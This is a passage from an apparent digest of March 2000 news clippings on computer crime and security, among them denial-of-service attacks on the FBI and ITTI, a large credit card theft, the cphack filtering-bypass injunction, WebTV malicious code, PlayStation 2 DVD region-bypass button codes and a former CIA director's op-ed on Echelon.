      earlier reports indicated. 

      "There was a number of recent attacks on JPL hosts originating from 
      various sites in Brazil, and as a temporary move while our computer 
      security people work, we're blocking network access to JPL from Brazil," 
      O'Donnell said.       "But this is a temporary thing." 

      He said normal service to South America's largest nation would return "in 
      a matter of days at most." 

      He added that he is "not aware of any (security) compromises per se in 
      these attacks." 

      Highly secure data at JPL generally is not stored on hosts that are 
      connected to the Internet, O'Donnell also said, but added that he could 
      "not go into a great deal of detail" on what kind of information was 
      sought. 

      MSNBC reported the Brazil problem after a network analyst at the Bank of 
      Brazil in Brasilia reported that he could not access the JPL site. 

      The service also reported that a CERT official at its headquarters in 
      Pittsburgh, Pa., said that blocking access to an entire network or country 
      is reasonably common, though the official said that spoofing attacks - 
      when the       address of the attacking e-mail in a denial of service 
      attack is falsified - blocking against a particular domain or country code 
      becomes largely ineffective. 

      O'Donnell said that CERT and the JPL have been working jointly on security 
      issues.

      FBI Web site attacked

      Wednesday, 15 March 2000 15:15 (ET)

      FBI Web site attacked

      By MICHAEL KIRKLAND

       WASHINGTON, March 15 (UPI) -- There has been another "denial of service"       
       cyber-attack against a high-profile Web site, sources told UPI Wednesday 
       -- this time the target was the FBI's own Web page, which was taken out 
       of action for several hours Tuesday.

       The attack hit just as the FBI was posting information about the 50th       
       anniversary of its "Ten Most Wanted Fugitives" list, which was celebrated 
       Tuesday at the bureau with the opening of a permanent headquarters 
       exhibit.

       A "denial of service" attack overwhelms a Web site with requests for       
       information, but with "spoofed" -- fabricated -- return e-mail addresses. 
       A site tries to endlessly answer the requests, and in effect ties itself 
       in knots until it shuts down.

       There was no indication yet on whether Tuesday's cyber-attack was a       
       "distributed" denial of service attack, similar to those launched against 
       major commerical sites on the Internet early last month. Those attacks 
       temporarily crippled Yahoo!, E-Trade, CNN.com and others.

       U.S. investigators were still pursuing leads on the latest attack       
       Wednesday, defining its nature.

       A "distributed" attack is one which uses "innocent" third-party computer       
       systems.

       Illegal hackers, called "crackers," usually find the attack software       
       "tools" available "in the wild" on the Internet.

       The "distributed denial of service," or DDOS, tools enable a cracker to       
       break into an unsuspecting computer system and implant "packets" or 
       "daemons" that will cause the system to launch an attack against a target 
       unless detected and disabled in time. Literally hundreds of "zombie" 
       computer systems can be infected, without their operators' knowledge, and 
       can launch a simultaneous attack.

       The FBI is still searching for at least two unnamed suspects in 
       February's       attacks. Much of the search has been concentrated in 
       Canada with the help of the Royal Canadian Mounted Police.

       Agents are also concentrating on Germany, where the DDOS "tools" may have       
       originated, though Germany is not believed to be the country of origin 
       for the actual attacks.

       There was no immediate indication Wednesday that the attack on the FBI       
       site came from the same suspects wanted for the attacks on the commerical 
       sites.

      Teen Busted in Internet Banking Scam 120 Fake Accounts Yielded $2,000 in

      By Carol Huang 

      JEFFERSON CITY, Mo. (APBnews.com) -- An eighth-grader in rural Missouri 
      signed up for more than 120 fake bank accounts through the Internet to 
      rake in a total of $2,000 in new customer cash rewards, authorities said 
      today. 

      "He didn't realize the gravity of what he was doing, but he knew it was 
      wrong and that it wasn't his money," said Cole County Sheriff John 
      Hemeyer. 

      Hemeyer said the boy, 14, a student at Thomas Jefferson Middle School, had 
      been helping his father, a self-employed construction contractor, enter 
      business records onto a computer when he found an Internet site offering 
      an opportunity to open a bank account. 

      Eventually, the teen had more than 120 accounts at banks around the 
      country, each under a name generated by his computer, and had transferred 
      more than $2,000 in cash freebies into a real account of his own.

      A puzzled postal worker reported delivering "bushels of baskets of mail" 
      to a vacant trailer on a plot of land, and investigating deputies went to 
      the boy's father, who owns the land. 

      Besides entering the teen into the juvenile court system, deputies 
      confiscated his computer, which he had upgraded using the cash rewards, 
      Hemeyer said. 

      "It's the only referral we've ever had on this kid. So if he quits, and 
      pays back some money, that will be about it," Hemeyer said.

      ITTI employee arrested in hacker attack By Bloomberg News March 15, 2000, 
      4:20 p.m. PT 

      An employee of Internet Trading Technologies, a provider of 
      trade-execution services for securities firms, was arrested yesterday and 
      charged with attacking ITTI computers and causing interruptions in its 
      services       this week, the U.S. Attorney's Office in Brooklyn said. 

      The employee, Abdelkader Smires, a database programmer, launched a series 
      of data transmissions intended to cause the firm's computers to crash 
      after he became involved in a dispute with his employers, according to 
      U.S.       Attorney Loretta Lynch. He was arraigned in federal court in 
      Brooklyn yesterday and ordered held without bail, Lynch said. 

                          ITTI's software system allows securities firms to 
                          trade Nasdaq stocks online, a representative for the 
                          company said. It is marketed by other firms, such as 
                          Trimark Group, under their own brand names, she                           
                          said. 

                          The system links small broker-dealers with 
                          market-makers like Knight/Trimark, Mayer & Schweitzer 
                          and others, a Knight/Trimark spokesman said. Firms use 
                          it so they don't have to install and maintain                           
                          direct hardware and software connections to 
                          market-makers. 

      Smires' attacks caused "significant interruption of ITTI's trade execution 
      over the past three business days," Lynch said. "If the attacks had 
      continued to cause denial of service, the viability of ITTI would have 
      been threatened, resulting       in major disruption of trading on the 
      Nasdaq," she added. 

      The U.S. Secret Service's Electronic Crimes Task Force, which is a 
      cooperative effort of 25 local, state and federal agencies and 45 private 
      companies, helped trace Smires' computer attacks, said Bob Weaver, a 
      Secret Service       representative. 

      Conflict developed between Smires and his bosses when ITTI's chief 
      development officer, who had hired Smires and was his supervisor, resigned 
      March 6, according to an affidavit filed in the case by Secret Service       
      Agent Peter Cavicchia. The firm then hired systems consultants to help 
      fill the gap created by the departure, but Smires and another, 
      unidentified programmer refused to help train the newcomers on ITTI's 
      systems, according to the affidavit. 

      Smires and the other programmer then told the firm's executives that they 
      would quit unless they were given "more employment security, a greater 
      salary and a greater equity interest in the firm," Cavicchia said. ITTI 
      responded by       offering them one-year employment contracts, raises and 
      stock options, he said. 

      Smires and the other programmer nevertheless decided to resign, according 
      to the affidavit. The pair demanded "$70,000 immediately, 50,000 stock 
      options and more substantial salary increases," Cavicchia said. A 
      "tentative       agreement" was reached March 8, Cavicchia said. 

      The next day, Smires and the other programmer backed out of the agreement, 
      demanded more favorable terms and said ITTI executives should call them 
      only if the firm agreed to the specific counter-offer, Cavicchia said. 
      ITTI didn't call.       Later on March 9, the attacks on ITTI's system 
      began. 

      The attacks continued Friday, Monday and yesterday, according to the 
      affidavit, shutting down ITTI's computers for a total of about five hours. 
      "While one of the attacks was occurring, ITTI computers revealed the 
      Internet Protocol       address of the attacking computer," enabling 
      employees to trace it to a building on the Queens College campus in 
      Flushing, New York, where Smires is an instructor, Cavicchia said. Secret 
      Service agents were told that the particular Queens College computer from 
      which the attack was launched was being used by Smires at the time, the 
      affidavit said. 

      After his arrest, Smires admitted that he was responsible for the March 13 
      and March 14 attacks, Cavicchia said. 

      Smires also waged some of his attacks from a Kinko's copy shop in 
      Manhattan, Lynch said.

      PlayStation 2 can play US DVDs - apparently
    
      Gaming boffins claim to have found a way to play American DVDs on PlayStation 2
      consoles. 
    
      Three codes have surfaced which make it possible to play Region 1 (North America)
      DVDs on the PlayStation 2 -- a Region 2 (Europe, Japan and Asia) DVD player. 
    
      Like console video games, DVDs are usually fixed by vendors so they can only
      operate within specific world markets. It was previously believed the PlayStation 2,
      launched solely in Japan, could play only Region 2 DVDs. 
    
      But the Gaming Intelligence Agency's Web site this week claimed to have found the
      codes needed to overcome this inconvenience. These codes do not work every time
      -- a hitch believed to be linked to how hard the Dual Shock 2' buttons are pressed. 
    
      "All three codes should be entered when the PlayStation 2 DVD bootup sequence
      begins fading to black... If you get a region failed message, don't despair; just try
      again. The same disc will work some times and not others," it reports. 
    
      "While these codes certainly leave room for improvement, the advent of any region
      bypass is good news for system importers and DVD fans," thegia.com adds. 
    
      Sony Computer Entertainment in the UK chose not to comment.

      GIA;
      
      Play American DVDs on Japanese PlayStation 2

          [03.11.00]  Simple controller codes make it possible.

       Two simple controller codes have recently surfaced that make it 
       possible to play Region 1 (North America) DVDs on the PlayStation 
       2, a Region 2 (Japan and Asia) DVD player. Much like console 
       videogames, DVDs are region encoded to dissuade consumers from 
       importing titles from outside of the country. It was previously 
       believed that the PlayStation 2 would only play Region 2 DVDs.

       These codes currently only work with about partial frequency. We 
       are currently unsure why they do not work 100% of the time; we 
       believe they may be dependent on how hard the user presses the Dual 
       Shock 2's analog buttons. If you own a PS2 and Region 1 movies, the 
       GIA is interested in hearing about your experiences with the code, 
       especially if you find a way to make Region 1 movies play with 
       greater frequency. Please e-mail staff@thegia.com with the movie 
       tested, code used, and the tries / success ratio.

       All three codes should be entered when the PlayStation 2 DVD bootup 
       sequence begins fading to black. The buttons should be held until 
       either the DVD movie starts up (1 line of Japanese) or a "region 
       failed" message appears (2 lines of Japanese). If you get a region 
       failed message, don't despair; just try again. The same disc will 
       work some times and not others.

       The first code comes from the GIA's own J.T. Kauffman; it is 
       apparently circulating Japanese message boards and web sites. The 
       code is: hold down L1, Circle, and Select. This code has worked 
       with both the Dual Shock 1 and 2 with about 40% accuracy.

       The second code comes from a friend of the GIA known as Barubary. 
       The code is: press in L3 (the left analog stick) straight and hard. 
       This code does not work with the Dual Shock 1, but works with the 
       Dual Shock 2 with about 60% accuracy.

       The newest, third code comes from GIA friend Nick "Rox" Des Barres. 
       Nick reports that this code works an astounding 95% of the time. 
       The instructions follow:

         Insert a first-generation PlayStation pad (i.e., not an analog 
         controller) in Control Port 1 of the PS2. Insert DVD Hold UP on 
         the pad until the DVD menu appears Highlight the play icon and 
         select it. 

       Nick adds, "I tried this on 20 or so DVDs, and it booted all of 
       them. Two or three would not play. You could access the menus, 
       however. It should be noted I was using a Japanese first-generation 
       PS1 pad, though I can't imagine why it wouldn't work with American 
       ones."

       While these codes certainly leave room for improvement, the advent 
       of any region bypass is good news for system importers and DVD 
       fans. The GIA will keep you posted on any new developments on the 
       PS2 DVD front.

      By Mike Brunker 
       MSNBC
               
      March 17   In the largest known case of
      cybertheft, a computer intruder stole information
      on more than 485,000 credit cards from an
      e-commerce site and then secretly stored the
      massive database on a U.S. government agencys
      Web site, MSNBC.com has learned. Credit card
      companies notified financial institutions, but
      many of the compromised accounts remain open
      to this day because the banks neither closed
      them nor notified customers of the theft.
      
            THE HEIST occurred in January 1999, but only a few
     details have previously been made public.
            The scope of the crime emerged in a letter dated Dec.

     Macken, a Secret Service spokesman, confirmed that the
     incident had occurred and added some details in an
     interview on Thursday.
            

           Two arrested in online credit card case

            The Visa letter, a copy of which was provided to
     MSNBC by a source in the banking industry, quotes federal
     authorities as saying that the credit card information 
     including expiration dates and cardholder names and
     addresses  was stolen from an Internet retail site by a
     hacker. 
             
                                     It said the store of
                              data on Visa,
                              MasterCard, American
                              Express and Discover
                              cards was discovered on
                              an unspecified government
                              computer system during an
                              audit. The letter did not
                              say when the stolen data
                              was found, but Macken
                              said it was discovered
                              before March 1999 on the
     Web site of a U.S. government agency, which he declined
     to identify.
            .This government Web administrator noticed that a lot
     of the memory was chewed up for no reason, so he
     checked and found the file (containing the stolen data),. he
     said.
            
     NO EVIDENCE OF FRAUDULENT USE 
            There was no evidence that any of the cards were used
     to commit fraud and some of the accounts were not active,
     Macken added.
            The letter said that authorities had not identified the
     thief, but Macken said investigators have since traced the
     criminal to Eastern Europe. The investigation is ongoing and
     involves diplomatic contacts with the country in question, he
     said.
            The Internet retail site from which the data was stolen
     has also since been identified, but Macken declined to name
     it. 

                                     It was unclear why
                              the thief hacked the
                              government Web site and
                              stored the data there,
                              Macken said, though he
                              allowed that the act might
                              have been the online
                              equivalent of thumbing
     ones nose at U.S. authorities.
            As MSNBC reported last week, U.S. authorities have
     so far been stymied in their attempts to prosecute credit
     card thieves and fraud rings based in the former Soviet bloc
     nations and Asia.
            

           Overseas fraud artists are untouchable


            Secret Service officials testified about some details of
     the case before Congress early last year to demonstrate the
     peril that computer hackers pose to online commerce,
     Macken said. Their comments generated little coverage,
     however, and the scope of the case is only now becoming
     clear.
            
     EFFORT TO HIGHLIGHT INACTION 

            The copy of the letter from Visa was obtained by
     MSNBC from an employee at the Navy Federal Credit
     Union, in Merrifield, Va., the worlds largest credit union
     with 19 million members. The letter was provided, the
     source said, to highlight the fact that some financial
     institutions are failing to act to protect consumers when
     there is evidence that their credit card information has been
     stolen.
            Officials at the credit union took no action to warn
     customers whose account numbers were among those
     stolen by the hacker, said the source, who spoke on
     condition of anonymity. Instead, they ordered a .spot
     check. of 50 to 100 accounts and then decided that no
     further action was necessary, the source said.
            The source said the same procedure was followed two
     weeks later, when Visa alerted the institution of the theft of
     data on 300,000 credit cards from the CD Universe Web
     site  the biggest theft of credit card data over the Internet
     that previously had been made public.
            .It was decided that ... it would be too much of an
     inconvenience and too costly to shut down the accounts and
     issue new numbers,. said the source. .It was deemed not
     the credit unions responsibility.. 
            The credit union source said that fraudulent charges
     have subsequently appeared on some of the accounts that
     were compromised, though it is impossible to definitively
     link the fraud to the theft.
            
     CREDIT UNION RESPONDS         

            In a statement issued Friday in response to
     MSNBC.coms story, Navy Federal Credit Union officials
     did not challenge the assertion that they did not warn
     customers of the theft. But they denied that cost or
     inconvenience were factors in the decision. 
            .When we received notification of this problem from
     VISA USA, we reviewed our systems and were confident
     that all appropriate controls were in place to protect our
     members financial welfare,. said Tom Steele, a credit union
     vice president in charge of the credit card division.
     .Additional checks of the 1,500 Navy Federal credit card
     accounts identified by VISA USA confirmed that the steps
     we had taken safeguarded every cardholder  we have
     also not seen any increase in fraud losses..
            The statement also indicated that no Navy Federal
     cardholders have been victims of identity theft as a result of
     the heist.
            Calls to American Express and a half dozen major
     banks seeking information on their response when notified
     of the theft were not returned.
            Scott Lynch, a spokesman for Visa USA, said he
     could not comment on the case. Nor would he explain why
     Visa didnt notify its members of the theft until December.
            Alicia Zatkowski, a spokeswoman for Discover
     Financial Services, said the firms fraud investigators were
     not aware of such a case.
            Vincent DeLuca, vice president of fraud control at
     MasterCard International, said, .We are aware of some
     cases but were not at liberty to talk about any ongoing
     investigations.

            Several financial institutions ordered the wholesale
     closure and replacement of cards that were compromised in
     the CD Universe case, which also remains under
     investigation. Such across-the-board replacement programs
     were well publicized in an effort to assure online consumers.
            
            Banks and credit card companies often point out that
     consumers are responsible only for the first $50 of
     fraudulent online purchases  and that is nearly always
     waived. 

            But stolen credit card information can be used to
     commit fraud against unsuspecting Internet merchants, who
     in most cases bear the cost of the crime, or for identity theft
      a practice in which criminals use personal data to obtain
     new credit, borrow money or make big-ticket purchases.
            The Treasury Department on Wednesday held a
     two-day national summit on identity theft to focus attention
     on what Treasury Secretary Lawrence Summers described
     as .a growing and major criminal threat.. 
            At the session, victims said that while they did not
     ultimately have to pay for the losses run up in their names,
     identity theft is by no means a victimless crime.
            .It has been sheer hell, and I do mean hell,. said
     Darlene Zele, a Rhode Island hospital worker who one of
     the victims who testified about years of struggling to repair
     the havoc wrought on their credit records. .At this point,
     after five years, its still not over..

      SECRET SERVICE HARASSING BERNIE S AGAIN 

      03/17/00 

      Five years to the day after Bernie S. was       arrested at gunpoint and 
      subjected to nearly 17 months of imprisonment by the United States Secret 
      Service, agents of the USSS have again begun some kind of cat and mouse 
      game, the nature of which has yet to be revealed. 

      A Special Agent from the Secret Service showed       up unannounced at 
      Bernie's workplace and told his employer they wanted to question Bernie, 
      who happened to be out sick that day. When Bernie returned to work the 
      following day and discovered the Secret Service wanted to talk to him, he 
      surprised the agent by calling him. What followed was an extremely strange 
      and circular conversation. 

      At first the SS agent wouldn't talk to him at       all. Then he called 
      Bernie back and said they needed to talk with him at his home at 7am the 
      next morning. When Bernie explained he was just getting over a serious 
      illness and that this was an unreasonable hour, the agent suggested 6am. 
      Bernie repeatedly offered to answer their questions at several neutral 
      locations, but they said any place other than his home was unacceptable. 
      Bernie told them he had nothing to hide, but that he was not comfortable 
      having Secret Service agents poking around inside his house and that they 
      would have to get a warrant before he'd let them in. The agent then said 
      he had to go and would talk to him later. 

      About ten minutes later, a second, more       polished, SS agent called 
      Bernie and continued trying to persuade him to let them inside his home. 
      The agent tried to goad Bernie by implying he must have something to hide, 
      and that if he didn't then there was no reason why they shouldn't be 
      allowed inside his home. At this point, Bernie tried to explain by saying 
      if you asked 100 people on the street if they'd want federal agents in 
      their living room and bedroom, almost everyone would say no and that he 
      was no exception. The SS agent disagreed, saying people have no legitimate 
      fears about such a visit. 

      Bernie repeatedly tried to get the SS agents to       tell him what they 
      wanted. Finally, the second agent said, "I need to check to see if your 
      telephone and Cable TV wiring is hooked up properly." This preposterous 
      claim made Bernie actually laugh out loud. But as a further gesture of 
      cooperation, Bernie offered to allow Bell Atlantic and Comcast Cable TV 
      technicians to inspect his house wiring for them. The SS agents said that, 
      too, would be unacceptable. It became clear the SS agents were simply 
      trying anything they could to get a foot in his door. Needless to say, 
      after Bernie's previous horrendous experience with the Secret Service, 
      their feet are not welcome in his home. He then gave them his attorney's 
      name and telephone number and told them to address future inquiries 
      directly to his lawyer. 

      So what is this all about? We don't know yet,       but clearly something 
      is up. And the way the Secret Service has played sick games with people's 
      lives in the past, we felt it would be wise to alert everyone now so we 
      can all keep a closer eye on them before they try any further outrageous 
      actions under the veil of secrecy.

      FROM THE OFFICE OF PUBLIC AFFAIRS

      FOR IMMEDIATE RELEASE
      March 15, 2000
      LS-465

      TREASURY CONVENES IDENTITY THEFT SUMMIT 

      Treasury Secretary Lawrence H. Summers convened a two-day National Summit 
      on Identity Theft today and announced four new initiatives targeted at 
      cracking down on the increasing threat of identity theft.

      Criminals are exploiting new technologies to make a significant profit 
      from an old crime," said Treasury Secretary Summers. "We will continue to 
      work with the private sector to strengthen our efforts to combat this 
      threat."

      Called for last year by President Clinton, the Summit will address the 
      prevention of identity theft, remediation and enforcement efforts with the 
      public and private sector. The Summit will consist of a series of panels 
      and more than 150 participants from federal,       state and local 
      government agencies, financial institutions, credit card companies and 
      reporting agencies, as well as identity theft victims, consumer advocacy 
      groups and private sector representatives.

      The four new Treasury initiatives to help combat identity theft include:

           Skimming and counterfeit check databases currently used to identify 
           common suspects, defendants of identity theft, and address criminal 
           trends prevalent in financial crimes today. These databases were 
           developed and are maintained by the U.S. Secret            Service in 
           partnership with the financial industry;

           A computer-based training module developed by the U.S. Secret Service 
           that will focus on financial crimes and all pertinent statutes 
           including identity theft, and be made available within the agency as 
           well as local and state law enforcement officials            
           throughout the U.S.; 

           A pilot program, developed by the U.S. Secret Service and Citicorp, 
           to help identify suspicious activity on electronic commerce. The 
           program will attempt to develop a protocol for the identification of 
           identity theft and other schemes used to commit bank            
           fraud, credit fraud and money laundering within electronic commerce 
           and the immediate notification of law enforcement authorities; and 

           Forums and mini-conferences to maintain a dialogue between the 
           private and public sector.

      Treasury's National Summit on Identity Theft is the first national level
      conference involving law enforcement, victims, industry and nonprofits 
      interested in the issue.

      Police to step up fight against e-crime

       Source: AAP | Published: Friday March 17, 3:38 PM 

       Police are set to recruit computer boffins in a bid to boost the fight 
       against so-called e-crime.

       The potential to commit crimes using computers and other information 
       technology was one of the greatest problems ever to face law enforcement, 
       Australian Federal Police Commissioner Mick Palmer said today.

       Speaking at the end of a week-long conference of police commissioners 
       from Australia, New Zealand, Fiji and Papua New Guinea, Commissioner 
       Palmer said a staggering 900 million people would be using the Internet 
       by the end of this year.

       'People who abuse these technologies have the capacity to commit offences 
       on a global basis, with complete anonymity, with speed and on a scale not 
       previously encountered,' Commissioner Palmer told journalists.

       Credit card fraud, electronic vandalism, terrorism, electronic money 
       laundering and tax evasion are some examples of electronic crime.

       'The capacity of properly organised, electronic based crime to undermine 
       the financial stability of small and medium sized countries is very 
       real,' Commissioner Palmer said.

       A major problem for police is how to attract personnel with enough 
       technical expertise to fight this new crime.

       Commissioner Palmer said already police recruitment and selection was 
       becoming more flexible.

       'Clearly some of the technical skills that we are going to need ... come 
       at a very high cost,' he said.

       'People ... in that industry are earning a lot of money and that makes 
       the partnerships with business and the wider business community very 
       important.'

       Police will be looking to exchange staff with private industry to gain 
       the skills necessary, probably on short term, project based arrangements.

       Commissioner Palmer said discussions and negotiations had already begun 
       on this issue and Commonwealth Bank CEO David Murray addressed the 
       commissioners.

       'We will be recruiting people from the coalface for short periods of 
       time, we are going to be sharing resources between ourselves and the 
       wider partnership both in the private and public sense.'

       The commissioners agreed to establish an Electronic Crime Steering 
       Committee to evaluate Australasia's capacity to fight electronic crime.

       It will develop an Australasian Law Enforcement Electronic Crime Strategy

      WebTV's 'Non-Virus' Virus 
      by Chris Oakes 

      3:00 a.m. Mar. 18, 2000 PST             

      Although it prefers to call the trouble a "malicious code," WebTV has 
      experienced its first virus.       Parent company Microsoft is working on 
      a patch of its service to counteract malicious programming code that 
      overloads WebTV newsgroup discussions with fake postings. 

      "Newsgroups are starting to flood with junk posts, and you can't post," 
      said Brian Bock, editor-in-chief of Net4TV Voice, an online publication 
      focusing on Internet services via television. WebTV users first reported 
      the problem to Net4TV. 

      Bock said the virus -- a first for the closed, non-PC WebTV system -- is 
      like the renowned PC virus Melissa. The similarity is that it 
      self-replicates, he said. But this virus does it by altering signatures 
      that appear at the bottom of WebTV user's Usenet messages. 

      "When another WebTV user runs across [an infected message], it writes the 
      virus into their email signature," he said. "Then when they go make a 
      Usenet posting, it cross-posts. They end up posting to a whole bunch of 
      different news groups." 

      The result is the multiplication of junk messages in discussion forums 
      until discussions are disrupted completely because the system's maximum 
      number of viewable messages is reached. 

      Microsoft was extremely reluctant to call the problem a virus. "It's not a 
      virus," said Microsoft spokeswoman Claire Haggard. "There's never been a 
      virus on WebTV." 

      Then what is it? 

      Haggard said the problem was malicious code in WebTV's Usenet posting 
      system. 

      The company took issue with the description of the code as 
      "self-replicating," saying it had to be "manually" inserted in Usenet 
      posts and didn't self-replicate. Furthermore, Haggard said the multiplying 
      Usenet messages did not involve the exploitation of a user's signature. 

      Bock said the virus does make use of an existing flaw in the service's 
      email system. That hole is exploited along with a WebTV code for posting 
      messages, Bock said. 

      The issues are separate, Haggard said. 

      In any case, the problem gets awfully close to meeting the conventional 
      definition of virus: a malicious code that, once installed, performs 
      usually undesirable tasks on the victim's computer. 

      In most technical definitions, self-replication is not a prerequisite, 
      although the Merriam-Webster definition of virus does include 
      self-replication: "A computer program usually hidden within another 
      seemingly innocuous program that produces copies of itself." 

      Virus or not, manual or self-replicating, the malicious code will be 
      patched, hopefully by next week, the company said. Meanwhile, WebTV will 
      be removing the junk posts. Haggard said the company has only heard from 
      14 users inquiring about the problem. 

      She said the company plans a regular update of its client and server 
      software soon, and that "the upgrade will be made immune from such hacker 
      problems."

      President Charles Taylor of Liberia has claimed that his
      country is under attack in a cyber war but failed to say
      by whom. He made the statement after his government
      shut down two independent radio stations and their
      related web sites. Amnesty International and the US
      State Department have vigorously protested the station
      closings.

     'Cyber War' in Liberia 
      Reuters 

      7:00 a.m. Mar. 17, 2000 PST      

      MONROVIA -- President Charles Taylor of Liberia, reacting to criticism of 
      the government's closure of two radio stations, said a "cyber war" had 
      been declared on his country. 

      "A cyber war has been declared on Liberia and the government is doing 
      everything possible to fight back," he said on Thursday at his Executive 
      Mansion after signing into law seven bills. 

      
      He did not say who was waging this war. 

      Star, an independent radio station that was closed down on Wednesday, had 
      an Internet news service popular with Liberians abroad that was also 
      closed. 

      The government justified the closures by saying that "agents provocateurs" 
      were using the news media, especially radio stations, to create security 
      problems. 

      "The government took the action to prevent an outbreak of another war 
      which could be caused by negative broadcasts to create hatred among the 
      Liberian people through hate messages," Taylor said. 

      Taylor's election in 1997 formally ended a civil war that he started in 
      December 1989. 

      The U.S. government joined human rights groups, local media, and the Press 
      Union of Liberia in protesting against the closures. 

      "The United States vigorously protests the unwarranted closure of these 
      two radio stations and calls on the Government of Liberia to reopen them 
      immediately, without conditions, and to return the confiscated equipment," 
      the U.S. State Department said in a statement. 

      Rights group Amnesty International has linked the closure of Star to a 
      March 13 broadcast it made about a U.S. State Department report on human 
      rights in Liberia. 

      Star was established in 1997 by the Hirondelle Foundation, a Swiss-based 
      non-governmental organization, with the help of the United States Agency 
      for International Development. 

      The second station, Radio Veritas, is run by the Roman Catholic Church. 
      The government suspended the station but said it could start operating 
      again if it provided a written assurance it would broadcast only religious 
      material. 

      The Catholic Archbishop of Monrovia said Veritas had a constitutional 
      right to broadcast. 

      "It is our constitutional right to disseminate information to the public 
      and if we abuse the right, let the courts deal with us, not the 
      executive," Archbishop Michael Kpakala Francis said in a statement 
      released late on Thursday. 

      "We will not give any commitment to the government of Liberia that will 
      restrict us to religious programs," he added, denying that Veritas' 
      license restricted it to religious broadcasts.

      Porn Software Injunction Issued 

      By Martin Finucane
      Associated Press Writer
      Friday, March 17, 2000; 1:33 p.m. EST

      BOSTON  A federal judge Friday ordered a halt to the distribution of
      a computer program that allows children to bypass software designed to
      keep them away from Internet pornography. 

      Microsystems Software Inc. of Framingham, which sells the widely used
      "Cyber Patrol" filtering software, sued two computer experts who
      distributed the bypassing software via the Internet. The software, called
      "cphack," also discloses a list of sites that are blocked by the Cyber Patrol
      program. 

      U.S. District Judge Edward F. Harrington ordered Matthew Skala, a
      self-described cryptography buff who attends the University of Victoria in
      British Columbia, and Eddy L.O. Jansson, believed to be living in
      Sweden, to stop spreading the "cphack" program. 

      The judge also blocked distribution of the "cphack" software by anyone
      working with them. 

      Microsystems attorney Irwin Schwartz said the judge's order extended to
      any "mirror" Web sites, where the program may have been copied and
      made available. Another hearing is set for March 27 on the case. 

      Skala and Jansson were not represented at Friday's hearing, and they did
      not immediately return e-mails seeking comment. 

      Microsystems has said in its legal filings it would suffer "irreparable harm"
      from the publication of the bypassing software, which it said sought to
      destroy the market for its product by rendering it ineffective. 

      "The practical effect is that ... children may bypass their parents' efforts to
      screen out inappropriate materials on the Internet," according to the filing
      made this week. 

      Free speech advocates criticized the company's move to block
      distribution of the software. 

      Peter Junger, a law professor at Case Western Reserve University in
      Cleveland and an advocate of free speech on the Internet, said it "looks
      like a rather horrifying challenge to people's right to write software" and to
      "reverse-engineer" software, which means figure out how it works. 

      "The idea that one can prevent reverse-engineering of software and
      publishing the results of that reverse-engineering strikes me as a very
      dangerous restriction on free speech," he said before the judge's ruling. 

      Chris Hansen, a senior lawyer with the national office of the American
      Civil Liberties Union, said there might be debate about whether
      distributing the bypass software was legal, but that the ACLU agreed with
      at least one role of the software  publicizing the list of blocked sites. 

      "Parents who want to install these products ought to be able to do so," he
      said, adding, "How can you, as a parent, make an intelligent decision (on
      filtering software)if the product won't tell you what they're blocking?"

      Why We Spy on Our Allies 

      By R. James Woolsey, a Washington lawyer and a former Director of Central 
      Intelligence. 

      What is the recent flap regarding Echelon and U.S. spying on European 
      industries all about? We'll begin with some candor from the American side. 
      Yes, my continental European friends, we have spied on you. And it's true 
      that we use computers to sort through       data by using keywords. Have 
      you stopped to ask yourselves what we're looking for? 

      The European Parliament's recent report on Echelon, written by British 
      journalist Duncan Campbell, has sparked angry accusations from continental 
      Europe that U.S. intelligence is stealing advanced technology from 
      European companies so that we can -- get       this -- give it to American 
      companies and help them compete. My European friends, get real. True, in a 
      handful of areas European technology surpasses American, but, to say this 
      as gently as I can, the number of such areas is very, very, very small. 
      Most European technology just isn't worth our stealing. 

      Why, then, have we spied on you? The answer is quite apparent from the 
      Campbell report -- in the discussion of the only two cases in which 
      European companies have allegedly been targets of American secret 
      intelligence collection. Of Thomson-CSF, the       report says: "The 
      company was alleged to have bribed members of the Brazilian government 
      selection panel." Of Airbus, it says that we found that "Airbus agents 
      were offering bribes to a Saudi official." These facts are inevitably left 
      out of European press reports. 

      That's right, my continental friends, we have spied on you because you 
      bribe. Your companies' products are often more costly, less technically 
      advanced or both, than your American competitors'. As a result you bribe a 
      lot. So complicit are your governments       that in several European 
      countries bribes still are tax-deductible. 

      When we have caught you at it, you might be interested, we haven't said a 
      word to the U.S. companies in the competition. Instead we go to the 
      government you're bribing and tell its officials that we don't take kindly 
      to such corruption. They often respond by       giving the most 
      meritorious bid (sometimes American, sometimes not) all or part of the 
      contract. This upsets you, and sometimes creates recriminations between 
      your bribers and the other country's bribees, and this occasionally 
      becomes a public scandal. We love it. 

      Why do you bribe? It's not because your companies are inherently more 
      corrupt. Nor is it because you are inherently less talented at technology. 
      It is because your economic patron saint is still Jean Baptiste Colbert, 
      whereas ours is Adam Smith. In spite of a       few recent reforms, your 
      governments largely still dominate your economies, so you have much 
      greater difficulty than we in innovating, encouraging labor mobility, 
      reducing costs, attracting capital to fast-moving young businesses and 
      adapting quickly to changing economic circumstances. You'd rather not go 
      through the hassle of moving toward less dirigisme. It's so much easier to 
      keep paying bribes. 

      The Central Intelligence Agency collects other economic intelligence, but 
      the vast majority of it is not stolen secrets. The Aspin-Brown Commission 
      four years ago found that about 95% of U.S. economic intelligence comes 
      from open sources. 

      The Campbell report describes a sinister-sounding U.S. meeting in 
      Washington where -- shudder! -- CIA personnel are present and the 
      participants -- brace yourself -- "identify major contracts open for bid" 
      in Indonesia. Mr. Campbell, I suppose, imagines       something like this: 
      A crafty CIA spy steals stealthily out of a safe house, changes disguises, 
      checks to make sure he's not under surveillance, coordinates with a spy 
      satellite and . . . buys an Indonesian newspaper. If you Europeans really 
      think we go to such absurd lengths to obtain publicly available 
      information, why don't you just laugh at us instead of getting in high 
      dudgeon? 

      What are the economic secrets, in addition to bribery attempts, that we 
      have conducted espionage to obtain? One example is some companies' efforts 
      to conceal the transfer of dual-use technology. We follow sales of 
      supercomputers and certain chemicals       closely, because they can be 
      used not only for commercial purposes but for the production of weapons of 
      mass destruction. Another is economic activity in countries subject to 
      sanctions -- Serbian banking, Iraqi oil smuggling. 

      But do we collect or even sort secret intelligence for the benefit of 
      specific American companies? Even Mr. Campbell admits that we don't, 
      although he can't bring himself to say so except with a double negative: 
      "In general this is not incorrect." The       Aspin-Brown Commission was 
      more explicit: "U.S. Intelligence Agencies are not tasked to engage in 
      'industrial espionage' -- i.e. obtaining trade secrets for the benefit of 
      a U.S. company or companies." 

      The French government is forming a commission to look into all this. I 
      hope the commissioners come to Washington. We should organize two seminars 
